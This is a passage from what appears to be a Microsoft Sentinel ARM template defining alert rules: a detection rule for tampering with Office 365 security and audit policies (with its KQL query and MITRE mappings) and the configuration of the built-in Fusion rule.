          "alertRuleTemplateName": "155f40c6-610d-497d-85fc-3cf06ec13256",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/49aa3210-efea-4eb9-a986-a03a959288b2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/49aa3210-efea-4eb9-a986-a03a959288b2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Office policy tampering",
          "description": "Identifies if any tampering is done to either auditlog, ATP Safelink, SafeAttachment, AntiPhish or Dlp policy. \nAn adversary may use this technique to evade detection or avoid other policy based defenses.\nReferences: https://docs.microsoft.com/powershell/module/exchange/advanced-threat-protection/remove-antiphishrule?view=exchange-ps.",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where RecordType =~ \"ExchangeAdmin\"\n| where UserType in~ (\"Admin\",\"DcAdmin\") \n// Only admin or global-admin can disable/remove policy\n| where Operation startswith \"Remove-\" or Operation startswith \"Disable-\"\n| where Operation has_any (\"AntiPhish\", \"SafeAttachment\", \"SafeLinks\", \"Dlp\", \"Audit\")\n| extend ClientIPOnly = case( \nClientIP has \".\", tostring(split(ClientIP,\":\")[0]), \nClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nClientIP\n)  \n| extend Port = case(\nClientIP has \".\", (split(ClientIP,\":\")[1]),\nClientIP has \"[\", tostring(split(ClientIP,\"]:\")[1]),\nClientIP\n)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationCount = count() by Operation, UserType, UserId, ClientIP = ClientIPOnly, Port, ResultStatus, Parameters\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1098",
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fbd72eb8-087e-466b-bd54-1ca6ea08c6d3",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BuiltInFusion')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BuiltInFusion')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Fusion",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "enabled": true,
          "alertRuleTemplateName": "f71aba3d-28fb-450b-b192-4e76a83015c8",
          "sourceSettings": [
            {
              "enabled": true,
              "sourceName": "Anomalies",
              "sourceSubTypes": null
            },
            {
              "enabled": true,
              "sourceName": "Alert providers",
              "sourceSubTypes": [
                {
                  "sourceSubTypeDisplayName": "Microsoft Entra ID Protection",
                  "sourceSubTypeName": "Azure Active Directory Identity Protection",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft 365 Defender",
                  "sourceSubTypeName": "Microsoft 365 Defender",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Cloud App Security",
                  "sourceSubTypeName": "Microsoft Cloud App Security",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Defender for Cloud",
                  "sourceSubTypeName": "Azure Defender",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Defender for Endpoint",
                  "sourceSubTypeName": "Microsoft Defender for Endpoint",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Defender for Identity",
                  "sourceSubTypeName": "Microsoft Defender for Identity",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Defender for IoT",
                  "sourceSubTypeName": "Azure Defender for IoT",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Microsoft Defender for Office 365",
                  "sourceSubTypeName": "Microsoft Defender for Office 365",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Azure Sentinel scheduled analytics rules",
                  "sourceSubTypeName": "Azure Sentinel scheduled analytics rules",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                },
                {
                  "sourceSubTypeDisplayName": "Azure Sentinel NRT analytic rules",
                  "sourceSubTypeName": "Azure Sentinel NRT analytic rules",
                  "enabled": true,
                  "severityFilters": {
                    "isSupported": true,
                    "filters": [
                      {
                        "severity": "High",
                        "enabled": true
                      },
                      {
                        "severity": "Medium",
                        "enabled": true
                      },
                      {
                        "severity": "Low",
                        "enabled": true
                      },
                      {
                        "severity": "Informational",
                        "enabled": true
                      }
                    ]
                  }
                }
              ]
            }
          ],
          "scenarioExclusionPatterns": []
        }
      }
    ]
  }
]